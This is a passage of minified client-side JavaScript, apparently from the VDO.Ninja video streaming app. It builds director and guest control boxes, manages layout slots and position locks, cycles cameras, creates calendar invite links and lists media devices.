class='soloButton' title='A direct solo view of the video/audio stream with nothing else'> \t\t\t\t<a class='soloLink advanced task' data-menu='context-menu' data-sololink='true' data-drag='1' draggable='true' onclick='copyFunction(this,event)' \t\t\t\tvalue='"+soloLink+"' href='"+soloLink+"'/>"+sanitizeChat(soloLink)+"</a>\t\t\t\t<button class='pull-right controlsGrid' onclick='copyFunction(this.previousElementSibling,event)'><i class='las la-user'></i><span translate='copy-solo-view-link'>copy solo view link</span></button>\t\t\t</div>\t\t\t<div id='groups'></div>",session.directorUUID?controls.innerHTML+="<div style='text-align: center;margin:10px 5px 5px 5px;display:block;'><h3 id='yourDirectorStatus'>This is you, a co-director.<br />You are also a performer.</h3></div>":controls.innerHTML+="<div style='text-align: center;margin:10px 5px 5px 5px;display:block;'><h3 id='yourDirectorStatus'>This is you, the director.<br />You are also a performer.</h3></div>"),controls.querySelectorAll("[data-action-type]").forEach((ele=>{ele.dataset.sid=session.streamID})),container.appendChild(controls),getById("guestFeeds").appendChild(container),Object.keys(session.sceneList).forEach(((scene,index)=>{if(document.getElementById("container_director")&&!getById("container_director").querySelectorAll('[data-scene="'+scene+'"]').length){var newScene=document.createElement("div");newScene.innerHTML='<button style="margin: 0 5px 10px 5px;" data-sid="'+session.streamID+'" data-action-type="addToScene" data-scene="'+scene+'"   title="Add to Scene '+scene+'" onclick="directEnable(this, event);"><span ><i class="las la-plus-square" style="color:#060"></i> Scene: '+scene+"</span></button>",newScene.classList.add("customScene");var added=!1;getById("container_director").querySelectorAll(".customScene>[data-scene]").forEach((ele=>{!added&&ele.dataset.scene>scene+""&&(ele.parentNode.parentNode.insertBefore(newScene,ele.parentNode),added=!0)})),added||getById("container_director").appendChild(newScene)}})),getById("groups").showDirector=!0,session.group.forEach((group=>{changeGroupDirectorAPI(group,!0,!1)})),oldGroups.forEach((group=>{changeGroupDirectorAPI(group,!1,!1)}));var labelID=document.getElementById("label_director");labelID.onclick=async function(ee){var oldlabel=ee.target.innerText;!1===session.label&&(oldlabel=""),window.focus();var newlabel=await promptAlt(getTranslation("enter-new-display-name"),!1,!1,oldlabel);if(null!==newlabel){""===(newlabel=newlabel.trim())?(newlabel=!1,miniTranslate(ee.target,"add-a-label"),ee.target.classList.add("addALabel")):(ee.target.innerText=newlabel,ee.target.classList.remove("addALabel")),session.label=newlabel;var data={changeLabel:!0};data.value=session.label,session.sendMessage(data)}},labelID.style.float="left",labelID.style.top="2px",labelID.style.marginLeft="5px",labelID.style.position="relative",labelID.style.cursor="pointer",session.label&&(labelID.innerText=session.label),pokeIframeAPI("control-box",!0,!0),session.slotmode&&(pokeIframeAPI("slot-updated",biggestSlot,null,session.streamID),session.pastSlots[session.streamID]=biggestSlot,createSlotUpdate())}function createSlotUpdate(UUID=!1){try{var newSlots={};if(document.querySelectorAll("[data--u-u-i-d][data-slot]").forEach((ele=>{newSlots[ele.dataset.slot]=ele.dataset.sid})),UUID)session.sendMessage({slotsUpdate:newSlots},UUID);else for(var uid in session.pcs)session.pcs[uid].layout&&session.sendMessage({slotsUpdate:newSlots},uid)}catch(e){errorlog(e)}}async function createDirectorScreenshareOnlyBox(){var soloLink=soloLinkGenerator(session.streamID+":s");document.getElementById("deleteme")&&getById("deleteme").parentNode.removeChild(getById("deleteme"));var controls=getById("controls_directors_blank").cloneNode(!0);controls.classList.remove("hidden"),controls.id="controls_screen_director";var container=document.createElement("div");container.className="vidcon directorMargins",container.id="container_screen_director";var buttons="";if(session.slotmode){var slots=document.querySelectorAll("div.slotsbar[data-slot]"),biggestSlot=0,slotDefault=null;session.streamID+":s"in session.pastSlots&&(slotDefault=session.pastSlots[session.streamID+":s"]);var allSlots=[];if(1==session.slotmode){for(var i=0;i<slots.length;i++)parseInt(slots[i].dataset.slot)>biggestSlot&&(biggestSlot=parseInt(slots[i].dataset.slot)),slotDefault===parseInt(slots[i].dataset.slot)&&(slotDefault=null),allSlots.push(parseInt(slots[i].dataset.slot));biggestSlot+=1}if(null!==slotDefault)biggestSlot=slotDefault;else if(1==session.slotmode){var bestfree=0;for(i=1;i<=biggestSlot;i++)if(!allSlots.includes(i)){bestfree=i;break}biggestSlot=bestfree}var slotName="slot: "+biggestSlot;biggestSlot||(slotName="unset"),buttons+="<div draggable='true' title='Drag to swap layout positions' ondragend='dragendSlot(event)' ondragstart='dragSlot(event)' ondrop='dropSlot(event)' ondragover='allowDropSlot(event)' data-sid='"+session.streamID+":s' data-slot='"+biggestSlot+"' class='slotsbar'>\t\t\t<button ondrop='dropSlot(event)' draggable='true' ondragend='dragendSlot(event)' ondragstart='dragSlot(event)' ondragover='allowDropSlot(event)' onclick='changeSlot(event, this);'>"+slotName+"</button></div>"}buttons+="<div title='Does not impact scene order.' class='shift'><i class='las la-angle-left' onclick='shiftPC(this,-1, true);'></i><i class='las la-angle-right' onclick='shiftPC(this,1, true)';></i></div>\t\t<div class='streamID' style='user-select: none;'>ID: <span style='user-select: text;'>"+session.streamID+":s</span>\t\t\t<i class='las la-copy' data-sid='"+session.streamID+":s'  onclick='copyFunction(this.dataset.sid,event)' title='Copy this Stream ID to the clipboard' style='cursor:pointer'></i>\t\t\t<i class='las la-window-minimize' onclick='minimizeMe(this, 'container_screen_director')' title='Minimize this control box'></i>\t\t\t<span id='label_director' class='addALabel' title='Click here to edit the label for this stream. Changes will propagate to all viewers of this stream' data-translate='add-a-label'>"+getTranslation("add-a-label")+"</span>\t\t</div>\t\t<div id='videoScreenContainer_director'></div>",container.innerHTML=buttons;var oldGroups=[];if(document.querySelectorAll("#groups [data-action-type='toggle-group'][data-group]:not(.green)").forEach((ee=>{oldGroups.push(ee.dataset.group)})),getById("groups").remove(),0==session.hidesololinks)if(controls.innerHTML+="<div class='soloButton' title='A direct solo view of the video/audio stream with nothing else'> \t\t\t\t<a class='soloLink advanced task' data-menu='context-menu' data-sololink='true' data-drag='1' draggable='true' onclick='copyFunction(this,event)' \t\t\t\tvalue='"+soloLink+"' href='"+soloLink+"'/>"+sanitizeChat(soloLink)+"</a>\t\t\t\t<button class='pull-right controlsGrid' style='width:100%' onclick='copyFunction(this.previousElementSibling,event)'><i class='las la-user'></i><span translate='copy-solo-view-link'>copy solo view link</span></button>\t\t\t</div>\t\t\t<div id='groups'></div>",session.directorUUID)controls.innerHTML+="<div style='text-align: center;margin:10px 5px 5px 5px;display:block;'><h3 id='yourDirectorStatusSS'>This is you, a co-director.<br />You are also a performer.</h3></div>";else if(!1===session.showDirector){try{controls.querySelectorAll('[data-action-type="addToScene"]').forEach((ele=>{ele.classList.add("hidden")}))}catch(e){errorlog(e)}controls.innerHTML+="<div style='text-align: center;margin:10px 5px 5px 5px;display:block;'><h3 id='yourDirectorStatusSS'>This is your screen share<br />It's *not* a performer.</h3></div>"}else controls.innerHTML+="<div style='text-align: center;margin:10px 5px 5px 5px;display:block;'><h3 id='yourDirectorStatusSS'>This your screen share.<br />It's also a performer.</h3></div>";controls.querySelectorAll("[data-action-type]").forEach((ele=>{ele.dataset.sid=session.streamID+":s"})),container.appendChild(controls),getById("guestFeeds").appendChild(container),Object.keys(session.sceneList).forEach(((scene,index)=>{if(document.getElementById("container_screen_director")&&!getById("container_screen_director").querySelectorAll('[data-scene="'+scene+'"]').length){var newScene=document.createElement("div");newScene.innerHTML='<button style="margin: 0 5px 10px 5px;" data-sid="'+session.streamID+':s" data-action-type="addToScene" data-scene="'+scene+'"   title="Add to Scene '+scene+'" onclick="directEnable(this, event);"><span ><i class="las la-plus-square" style="color:#060"></i> Scene: '+scene+"</span></button>",newScene.classList.add("customScene");var added=!1;getById("container_screen_director").querySelectorAll(".customScene>[data-scene]").forEach((ele=>{!added&&ele.dataset.scene>scene+""&&(ele.parentNode.parentNode.insertBefore(newScene,ele.parentNode),added=!0)})),added||getById("container_screen_director").appendChild(newScene)}})),getById("groups").showDirector=!0,session.group.forEach((group=>{changeGroupDirectorAPI(group,!0,!1)})),oldGroups.forEach((group=>{changeGroupDirectorAPI(group,!1,!1)}));var labelID=document.getElementById("label_director");labelID.onclick=async function(ee){var oldlabel=ee.target.innerText;!1===session.label&&(oldlabel=""),window.focus();var newlabel=await promptAlt(getTranslation("enter-new-display-name"),!1,!1,oldlabel);if(null!==newlabel){""===(newlabel=newlabel.trim())?(newlabel=!1,miniTranslate(ee.target,"add-a-label"),ee.target.classList.add("addALabel")):(ee.target.innerText=newlabel,ee.target.classList.remove("addALabel")),session.label=newlabel;var data={changeLabel:!0};data.value=session.label,session.sendMessage(data)}},labelID.style.float="left",labelID.style.top="2px",labelID.style.marginLeft="5px",labelID.style.position="relative",labelID.style.cursor="pointer",session.label&&(labelID.innerText=session.label),pokeIframeAPI("control-box",!0,!0),session.slotmode&&(pokeIframeAPI("slot-updated",biggestSlot,null,session.streamID+":s"),session.pastSlots[session.streamID+":s"]=biggestSlot,createSlotUpdate())}function shiftPC(ele,shift,director=!1){if(director)var target=document.getElementById("container_director");else target=document.getElementById("container_"+ele.dataset.UUID);if(target){target.shifted=!0;var target2=!1;if(1==shift?target.nextSibling&&(target2=target.nextSibling,target.parentNode.insertBefore(target.nextSibling,target)):target.previousSibling&&(target2=target.previousSibling,target.parentNode.insertBefore(target,target.previousSibling)),updateLockedElements(),session.api){for(var slots={},elements=getById("guestFeeds").children,i=0;i<elements.length;i++)if(elements[i]===target){var tmp=target.querySelector("[data-sid]");if(tmp)(lock=target.querySelector("[data-locked]"))&&(lock=parseInt(lock.dataset.locked)),slots[tmp=tmp.dataset.sid]=lock||i+1}else if(elements[i]===target2){var lock;if(tmp)(lock=target2.querySelector("[data-locked]"))&&(lock=parseInt(lock.dataset.locked)),slots[tmp=tmp.dataset.sid]=lock||i+1}pokeAPI("positionChange",slots)}}}function updateLockedElements(){for(var eles=getById("guestFeeds").children,i=0;i<eles.length;i++)try{var UUID=eles[i].UUID,lock=document.getElementById("position_"+UUID).dataset.locked;parseInt(lock)&&lockPosition(document.getElementById("position_"+UUID),!0)}catch(e){}}function lockPosition(ele,apply=!1){var UUID=ele.dataset.UUID;if(apply)if(ele.dataset.locked&&parseInt(ele.dataset.locked)){if(getById("guestFeeds")){var currentPosition=Array.prototype.indexOf.call(getById("guestFeeds").children,document.getElementById("container_"+UUID))+1;for(ele.innerHTML="<b>#"+ele.dataset.locked+"</b>",ele.parentNode.classList.add("locked");currentPosition>parseInt(ele.dataset.locked);){var node=document.getElementById("container_"+UUID);parent=node.parentNode,prev=node.previousSibling,oldChild=parent.removeChild(node),parent.insertBefore(oldChild,prev),currentPosition=Array.prototype.indexOf.call(getById("guestFeeds").children,document.getElementById("container_"+UUID))+1}for(;currentPosition<parseInt(ele.dataset.locked)&&getById("guestFeeds").children.length>currentPosition;){node=document.getElementById("container_"+UUID);parent=node.parentNode,next=node.nextSibling,oldChild=parent.removeChild(node),parent.insertBefore(node,next.nextSibling),currentPosition=Array.prototype.indexOf.call(getById("guestFeeds").children,document.getElementById("container_"+UUID))+1}}}else ele.dataset.locked=0,ele.innerHTML="<i class='las la-lock-open'></i>",ele.parentNode.classList.remove("locked");else ele.dataset.locked&&parseInt(ele.dataset.locked)?(ele.dataset.locked=0,ele.innerHTML="<i class='las la-lock-open'></i>",ele.parentNode.classList.remove("locked")):getById("guestFeeds")&&(ele.dataset.locked=Array.prototype.indexOf.call(getById("guestFeeds").children,document.getElementById("container_"+UUID))+1,ele.innerHTML="<b>#"+ele.dataset.locked+"</b>",ele.parentNode.classList.add("locked"))}function allowDropSlot(event){event.preventDefault()}function dragSlot(event){log("drag");var ele=event.target;!ele.dataset.UUID&&ele.parentNode.dataset.UUID&&(ele=ele.parentNode),event.dataTransfer.setDragImage(getById("dragImage"),24,24),event.dataTransfer.setData("text",ele.dataset.UUID);for(var eles=document.querySelectorAll(".slotsbar"),i=0;i<eles.length;i++)eles[i].dataset.UUID!=ele.dataset.UUID&&(eles[i].style.boxShadow="0px 0px 8px 2px #FFF")}function dragendSlot(event){for(var eles=document.querySelectorAll(".slotsbar"),i=0;i<eles.length;i++)eles[i].style.boxShadow="unset";return!0}function dropSlot(event){log("drop"),event.preventDefault(),event.stopPropagation();var UUID=event.dataTransfer.getData("text"),origThing=document.querySelector("[data--u-u-i-d='"+UUID+"'][data-slot]");if(origThing&&"slot"in event.target.dataset){log(event.target);var tmp=event.target.dataset.UUID;event.target.dataset.UUID=origThing.dataset.UUID,origThing.dataset.UUID=tmp,swapNodes(event.target,origThing),pokeIframeAPI("slot-updated",parseInt(event.target.dataset.slot),null,event.target.dataset.sid),pokeIframeAPI("slot-updated",parseInt(origThing.dataset.slot),null,origThing.dataset.sid),session.pastSlots[event.target.dataset.sid]=parseInt(event.target.dataset.slot),session.pastSlots[origThing.dataset.sid]=parseInt(origThing.dataset.slot)}else if(origThing&&"slot"in event.target.parentNode.dataset){log(event.target.parentNode);tmp=event.target.parentNode.dataset.UUID;event.target.parentNode.dataset.UUID=origThing.dataset.UUID,origThing.dataset.UUID=tmp,swapNodes(event.target.parentNode,origThing),pokeIframeAPI("slot-updated",parseInt(event.target.parentNode.dataset.slot),null,event.target.parentNode.dataset.sid),pokeIframeAPI("slot-updated",parseInt(origThing.dataset.slot),null,origThing.dataset.sid),session.pastSlots[event.target.parentNode.dataset.sid]=parseInt(event.target.parentNode.dataset.slot),session.pastSlots[origThing.dataset.sid]=parseInt(origThing.dataset.slot)}return createSlotUpdate(),!1}function dragenterSlot(event){event.preventDefault(),event.target.classList.contains("slotsbar")&&(event.target.style.border="3px dotted black")}function dragleaveSlot(event){event.preventDefault(),event.target.classList.contains("slotsbar")&&(event.target.style.border="")}async function changeSlot(event,ele){var picker=document.getElementById("slotPicker");if(picker)clearTimeout(modalTimeout),document.getElementById("modalBackdrop")&&(getById("alertModal").innerHTML="",getById("alertModal").remove(),getById("modalBackdrop").innerHTML="",getById("modalBackdrop").remove()),zindex=31+document.querySelectorAll(".alertModal").length,message=picker.innerHTML,modalTemplate=`<div class="alertModal" id="alertModal" style="text-align: center;z-index:${zindex+2}">\t\n\t\t\t\t<div class="alertModalInner">\n\t\t\t\t\t<span class='modalClose' onclick="closeModal()">Ã—</span>\n\t\t\t\t\t<span id="alertModalMessage" class='alertModalMessage'>${message}</span>\n\t\t\t\t</div>\n\t\t\t</div>\n\t\t\t<div id="modalBackdrop" style="z-index:${zindex+1}"></div>`,document.body.insertAdjacentHTML("beforeend",modalTemplate),document.getElementById("modalBackdrop").addEventListener("click",closeModal),document.getElementById("alertModalMessage").querySelectorAll("div[data-slot]").forEach((choice=>{choice.onclick=function(){setSlot(ele,parseInt(this.dataset.slot)),closeModal()}})),document.getElementById("alertModal").style.left=event.pageX+"px",document.getElementById("alertModal").style.top=event.pageY+180+"px",getById("alertModal").addEventListener("click",(function(e){return e.stopPropagation(),!1}));else{var slot=await promptAlt("Which slot to change to?");setSlot(ele,slot)}}function setSlot(ele,slot){if(log("setSlot()"),getById("slotPicker").classList.add("hidden"),null!==slot){slot=parseInt(slot)||0;for(var slots=document.querySelectorAll("div.slotsbar[data-slot]"),i=0;i<slots.length;i++)if(parseInt(slots[i].dataset.slot)==slot){slots[i].dataset.slot=ele.parentNode.dataset.slot,slots[i].querySelector("button").innerText=ele.innerText,warnlog("Slot already existed; setting old one to 0 (unset)"),pokeIframeAPI("slot-updated",parseInt(slots[i].dataset.slot),null,slots[i].dataset.sid),session.pastSlots[slots[i].dataset.sid]=parseInt(slots[i].dataset.slot);break}ele.parentNode.dataset.slot=slot,ele.innerText=slot?"slot: "+slot:"unset",pokeIframeAPI("slot-updated",slot,null,ele.parentNode.dataset.sid),session.pastSlots[ele.parentNode.dataset.sid]=slot,createSlotUpdate()}}function swapNodes(n1,n2){log("swapping nodes");var i1,i2,p1=n1.parentNode,p2=n2.parentNode;if(p1&&p2&&!p1.isEqualNode(n2)&&!p2.isEqualNode(n1)){for(var i=0;i<p1.children.length;i++)p1.children[i].isEqualNode(n1)&&(i1=i);for(i=0;i<p2.children.length;i++)p2.children[i].isEqualNode(n2)&&(i2=i);p1.isEqualNode(p2)&&i1<i2&&i2++,p1.insertBefore(n2,p1.children[i1]),p2.insertBefore(n1,p2.children[i2])}}function remoteRemoveQueue(ele){let ts={...transferSettings};ts.justResetting=!0,session.directMigrateIssue(session.roomid,ts,ele.dataset.UUID),ele.classList.add("hidden")}function createControlBox(UUID,soloLink,streamID,slot_init=!1){document.getElementById("deleteme")&&getById("deleteme").parentNode.removeChild(getById("deleteme"));var controls=getById("controls_blank").cloneNode(!0);controls.classList.remove("hidden"),controls.id="controls_"+UUID;var container=document.createElement("div");if(container.className="vidcon directorMargins",container.id="container_"+UUID,container.UUID=UUID,container.dataset.UUID=UUID,session.orderby)try{for(var added=!1,i=0;i<getById("guestFeeds").children.length;i++)if(getById("guestFeeds").children[i].UUID&&!getById("guestFeeds").children[i].shifted&&getById("guestFeeds").children[i].UUID in session.rpcs&&session.rpcs[getById("guestFeeds").children[i].UUID].streamID.toLowerCase()>streamID.toLowerCase()){getById("guestFeeds").insertBefore(container,getById("guestFeeds").children[i]),added=!0;break}added||getById("guestFeeds").appendChild(container)}catch(e){getById("guestFeeds").appendChild(container)}else getById("guestFeeds").appendChild(container);session.rpcs[UUID].voiceMeter||(1==session.meterStyle?session.rpcs[UUID].voiceMeter=getById("voiceMeterTemplate2").cloneNode(!0):(session.rpcs[UUID].voiceMeter=getById("voiceMeterTemplate").cloneNode(!0),session.rpcs[UUID].voiceMeter.style.opacity=0,2==session.meterStyle?(session.rpcs[UUID].voiceMeter.classList.add("video-meter-2"),session.rpcs[UUID].voiceMeter.classList.remove("video-meter")):session.rpcs[UUID].voiceMeter.classList.add("video-meter-director")),session.rpcs[UUID].voiceMeter.id="voiceMeter_"+UUID,session.rpcs[UUID].voiceMeter.dataset.level=0,session.rpcs[UUID].voiceMeter.classList.remove("hidden")),session.rpcs[UUID].remoteMuteElement=getById("muteStateTemplate").cloneNode(!0),session.rpcs[UUID].remoteMuteElement.id="",session.rpcs[UUID].remoteMuteElement.style.top="5px",session.rpcs[UUID].remoteMuteElement.style.right="7px",session.rpcs[UUID].remoteVideoMuteElement=getById("videoMuteStateTemplate").cloneNode(!0),session.rpcs[UUID].remoteVideoMuteElement.id="",session.rpcs[UUID].remoteVideoMuteElement.style.top="5px",session.rpcs[UUID].remoteVideoMuteElement.style.right="28px",session.rpcs[UUID].remoteRaisedHandElement=getById("raisedHandTemplate").cloneNode(!0),session.rpcs[UUID].remoteRaisedHandElement.id="",session.rpcs[UUID].remoteRaisedHandElement.style.top="5px",session.rpcs[UUID].remoteRaisedHandElement.style.right="49px";var videoContainer=document.createElement("div");videoContainer.id="videoContainer_"+UUID,videoContainer.style.margin="0",videoContainer.style.position="relative",videoContainer.style.minHeight="30px";var iframeDetails=document.createElement("div");iframeDetails.id="iframeDetails_"+UUID,iframeDetails.className="iframeDetails hidden",controls.innerHTML+="<div id='advanced_audio_director_"+UUID+"' class='hidden advancedAudioSettings'></div>",controls.innerHTML+="<div id='advanced_video_director_"+UUID+"' class='hidden advancedVideoSettings'></div>";var handsID="hands_"+UUID;0==session.hidesololinks&&(controls.innerHTML+="<div class='soloButton' title='A direct solo view of the video/audio stream with nothing else. Its audio can be remotely controlled from here'> \t\t\t\t<a class='soloLink advanced task'  data-menu='context-menu' data-sololink='true' data-drag='1' draggable='true' onclick='copyFunction(this,event)' \t\t\t\tvalue='"+soloLink+"' href='"+soloLink+"'/>"+sanitizeChat(soloLink)+"</a>\t\t\t\t<button class='pull-right controlsGrid' onclick='copyFunction(this.previousElementSibling,event)'><i class='las la-user'></i><span translate='copy-solo-view-link'>copy solo view link</span></button>\t\t\t</div>"),controls.innerHTML+='<button data-action-type="hand-raised" data--u-u-i-d=\''+UUID+"' id='"+handsID+"' class='hidden lowerRaisedHand' title=\"This guest raised their hand. Click this to clear notification.\" onclick=\"remoteLowerhands('"+UUID+'\');">\t\t\t<i class="las la-hand-paper"></i>\t\t\t<span data-translate="user-raised-hand">Lower Raised Hand</span>\t\t</button>\t\t</div>',controls.innerHTML+='<button data-action-type="remove-queue"  data--u-u-i-d=\''+UUID+'\' class=\'hidden removeFromQueue\' title="Takes the guest out of queue mode; they will then join as a normal guest." onclick="remoteRemoveQueue(this);">\t\t\t<i class="las la-plus"></i>\t\t\t<span data-translate="remove-from-queue">Activate Guest</span>\t\t</button>\t\t</div>',controls.querySelectorAll("[data-action-type]").forEach((ele=>{ele.dataset.UUID=UUID,ele.dataset.sid=streamID}));var buttons="";if(session.slotmode){var slots=document.querySelectorAll("div.slotsbar[data-slot]"),biggestSlot=0,slotDefault=null;slot_init&&1==session.slotmode&&(slotDefault=slot_init||null),streamID in session.pastSlots&&(slotDefault=session.pastSlots[streamID]);var allSlots=[];if(1==session.slotmode){for(i=0;i<slots.length;i++)parseInt(slots[i].dataset.slot)>biggestSlot&&(biggestSlot=parseInt(slots[i].dataset.slot)),allSlots.push(parseInt(slots[i].dataset.slot)),slotDefault===parseInt(slots[i].dataset.slot)&&(slotDefault=null);biggestSlot+=1}if(null!==slotDefault)biggestSlot=slotDefault;else if(slot_init&&1==session.slotmode)biggestSlot=0;else if(1==session.slotmode){var bestfree=0;for(i=1;i<=biggestSlot;i++)if(!allSlots.includes(i)){bestfree=i;break}biggestSlot=bestfree}var slotName="slot: "+biggestSlot;biggestSlot||(slotName="unset"),buttons+="<div draggable='true' title='Drag to swap layout positions' ondragend='dragendSlot(event)' ondragstart='dragSlot(event)' ondrop='dropSlot(event)' ondragover='allowDropSlot(event)' data-slot='"+biggestSlot+"' data--u-u-i-d='"+UUID+"' data-sid='"+streamID+"' class='slotsbar'>\t\t\t<button ondrop='dropSlot(event)' draggable='true' ondragend='dragendSlot(event)' ondragstart='dragSlot(event)' ondragover='allowDropSlot(event)' onclick='changeSlot(event, this);'>"+slotName+"</button></div>"}buttons+="<div title='Does not impact scene order.' class='shift'><i class='las la-angle-left' data--u-u-i-d='"+UUID+"' onclick='shiftPC(this,-1);'></i><span onclick='lockPosition(this);' style='cursor:pointer;' data-locked='0' data--u-u-i-d='"+UUID+"' id='position_"+UUID+"'><i class='las la-lock-open'></i></span><i class='las la-angle-right' data--u-u-i-d='"+UUID+"' onclick='shiftPC(this,1);'></i></div><div class='streamID' style='user-select: none;'>ID: <span style='user-select: text;'>"+streamID+"</span>\t<i class='las la-copy' data-sid='"+streamID+"' onclick='copyFunction(this.dataset.sid,event)' title='Copy this Stream ID to the clipboard' style='cursor:pointer'></i>\t<i class='las la-window-minimize' data--u-u-i-d='"+UUID+"' onclick='minimizeMe(this)' title='Minimize this control box' style='cursor:pointer'></i>\t<span id='label_"+UUID+"' class='addALabel' title='Click here to edit the label for this stream. Changes will propagate to all viewers of this stream'></span>\t</div>",container.innerHTML=buttons,updateLockedElements();var videoContainerControlBox=document.createElement("div");videoContainerControlBox.className="controlVideoBox",container.containerControlBox=videoContainerControlBox,container.appendChild(videoContainerControlBox),videoContainerControlBox.appendChild(videoContainer),session.signalMeter&&(session.rpcs[UUID].signalMeter||(session.rpcs[UUID].signalMeter=getById("signalMeterTemplate").cloneNode(!0),session.rpcs[UUID].signalMeter.id="signalMeter_"+UUID,session.rpcs[UUID].signalMeter.dataset.level=0,session.rpcs[UUID].signalMeter.classList.remove("hidden"),session.rpcs[UUID].signalMeter.dataset.UUID=UUID,session.rpcs[UUID].signalMeter.title=getTranslation("signal-meter"),session.rpcs[UUID].stats.info&&session.rpcs[UUID].stats.info.cpuLimited&&(session.rpcs[UUID].signalMeter.dataset.cpu="1"),!1!==session.statsMenu&&session.rpcs[UUID].signalMeter.addEventListener("click",(function(e){log("clicked signal meter");try{if(e.preventDefault(),!1!==session.statsMenu){var uid=e.currentTarget.dataset.UUID;if("stats"in session.rpcs[uid]){var[menu,innerMenu]=statsMenuCreator();printViewStats(innerMenu,uid),menu.interval=setInterval(printViewStats,session.statsInterval,innerMenu,uid)}}return e.stopPropagation(),!1}catch(e){errorlog(e)}}))),videoContainer.appendChild(session.rpcs[UUID].signalMeter)),session.batteryMeter&&(session.rpcs[UUID].batteryMeter||(session.rpcs[UUID].batteryMeter=getById("batteryMeterTemplate").cloneNode(!0),session.rpcs[UUID].batteryMeter.id="batteryMeter_"+UUID,batteryMeterInfoUpdate(UUID)),videoContainer.appendChild(session.rpcs[UUID].batteryMeter)),session.showConnections&&(session.rpcs[UUID].connectionDetails||createConnectionDetailsEle(UUID),videoContainer.appendChild(session.rpcs[UUID].connectionDetails)),videoContainer.appendChild(session.rpcs[UUID].voiceMeter),videoContainer.appendChild(session.rpcs[UUID].remoteMuteElement),videoContainer.appendChild(session.rpcs[UUID].remoteVideoMuteElement),videoContainer.appendChild(session.rpcs[UUID].remoteRaisedHandElement),videoContainer.appendChild(iframeDetails),container.appendChild(controls),session.group.forEach((group=>{if(!controls.querySelector('[data-action-type="toggle-group"][data--u-u-i-d="'+UUID+'"][data-group="'+group+'"]')){var newGroup=htmlToElement('<button style="margin: 0 5px 10px 5px;" data-sid="'+session.rpcs[UUID].streamID+'" data--u-u-i-d="'+UUID+'" data-action-type="toggle-group" data-group="'+group+'"   title="Add to Group: '+group+'" onclick="changeGroup(this, event);"><span ><i class="las la-users" style="color:#060"></i>'+group+"</span></button>"),added=!1;if(container.querySelectorAll(".customGroup>[data-group]").forEach((ele=>{log(ele),!added&&ele.dataset.group>group+""&&(ele.parentNode.insertBefore(newGroup,ele),added=!0)})),!added){var newGroupCon=container.querySelector(".customGroup");newGroupCon||((newGroupCon=document.createElement("div")).classList.add("customGroup"),container.appendChild(newGroupCon)),newGroupCon.appendChild(newGroup)}}})),initSceneList(UUID),syncSceneState(streamID),syncOtherState(streamID),pokeIframeAPI("control-box",!0,UUID),session.slotmode&&(pokeIframeAPI("slot-updated",biggestSlot,UUID),session.pastSlots[streamID]=biggestSlot,createSlotUpdate())}function minimizeMe(button,director=!1){director?getById(director).classList.toggle("minimized"):getById("container_"+button.dataset.UUID).classList.toggle("minimized")}function cycleCameras(){if(session.screenShareState)warnUser("Stop the screen-share first.");else{var videoSelect=document.querySelector("select#videoSource3").options,matched=!1,maxIndex=parseInt(getById("flipcamerabutton").dataset.maxIndex)||parseInt(videoSelect.length);maxIndex>parseInt(videoSelect.length)&&(maxIndex=parseInt(videoSelect.length));for(var i=0;i<maxIndex;i++){if((selOption=videoSelect[i]).selected)matched=!0;else if(matched)return getById("flipcamerabutton").classList.contains("flip")?(getById("flipcamerabutton").classList.remove("flip"),getById("flipcamerabutton").classList.add("flip2")):(getById("flipcamerabutton").classList.remove("flip2"),getById("flipcamerabutton").classList.add("flip")),document.querySelector("select#videoSource3").value=selOption.value,activatedPreview=!1,void grabVideo(session.quality,"videosource","select#videoSource3")}for(i=0;i<maxIndex;i++){var selOption;return(selOption=videoSelect[i]).selected?void 0:(getById("flipcamerabutton").classList.contains("flip")?(getById("flipcamerabutton").classList.remove("flip"),getById("flipcamerabutton").classList.add("flip2")):(getById("flipcamerabutton").classList.remove("flip2"),getById("flipcamerabutton").classList.add("flip")),document.querySelector("select#videoSource3").value=selOption.value,activatedPreview=!1,void grabVideo(session.quality,"videosource","select#videoSource3"))}}}function addToGoogleCalendar(){var details="Join the live stream as a performer at the following link:<br/><br/>===>   "+getById("director_block_1").innerText+"<br/><br/>To test your connection and camera ahead of time, please visit https://vdo.ninja/speedtest<br/><br/>Do not share the details of this invite with others, unless explicitly told to.",linkToOpen="https://calendar.google.com/calendar/r/eventedit?text=Live Stream&details="+(details=(details=details.split(" ").join("+")).split("&").join("%26"));window.open(linkToOpen)}function addToOutlookCalendar(){var details="Join the live stream as a performer at the following link:<br/><br/>===>   "+getById("director_block_1").innerText+"<br/><br/>To test your connection and camera ahead of time, please visit https://vdo.ninja/speedtest<br/><br/>Do not share the details of this invite with others, unless explicitly told to.",linkToOpen="https://outlook.live.com/owa/?path=%2Fcalendar%2Faction%2Fcompose&rru=addevent&subject=Live Stream&body="+(details=(details=details.split(" ").join("%20")).split("&").join("%26"));window.open(linkToOpen)}function addToYahooCalendar(){var details="Join the live stream as a performer at the following link:<br/><br/>===>   "+getById("director_block_1").innerText+"<br/><br/>To test your connection and camera ahead of time, please visit https://vdo.ninja/speedtest<br/><br/>Do not share the details of this invite with others, unless explicitly told to.",linkToOpen="https://calendar.yahoo.com?v60&title=Live Stream&desc="+(details=(details=details.split(" ").join("%20")).split("&").join("%26"));window.open(linkToOpen)}function toggle(ele,tog=!1,inline=!0){var x=ele;"none"===x.style.display?x.style.display=inline?"inline-block":"block":x.style.display="none",tog&&(tog.dataset.saved?(tog.innerHTML=tog.dataset.saved,delete tog.dataset.saved):(tog.dataset.saved=tog.innerHTML,tog.innerHTML="Hide This"))}function toggleByDataset(filter){for(var elements=document.querySelectorAll('[data-cluster="'+filter+'"]'),i=0;i<elements.length;i++)elements[i].classList.toggle("hidden")}var SelectedAudioOutputDevices=!1,SelectedAudioInputDevices=[],SelectedVideoInputDevices=[];async function enumerateDevices(){return log("enumerated start"),"object"==typeof navigator.mediaDevices&&"function"==typeof navigator.mediaDevices.enumerateDevices?await navigator.mediaDevices.enumerateDevices():"function"==typeof navigator.enumerateDevices?(log("enumerated failed 1"),await navigator.enumerateDevices()):await new Promise(((resolve,reject)=>{try{if(null==window.MediaStreamTrack||null==window.MediaStreamTrack.getSources)throw new Error;window.MediaStreamTrack.getSources((devices=>{resolve(devices.filter((device=>"video"===device.kind.toLowerCase()||"videoinput"===device.kind.toLowerCase())).map((device=>({deviceId:null!=device.deviceId?device.deviceId:"",groupId:device.groupId,kind:"videoinput",label:device.label,toJSON:function(){return this}}))))}))}catch(e){errorlog(e),session.cleanOutput||("https:"!==location.protocol?warnUser("Error listing the media devices.\n\nThe website needs to be loaded via https (ssl) to access media devices."):"isSecureContext"in 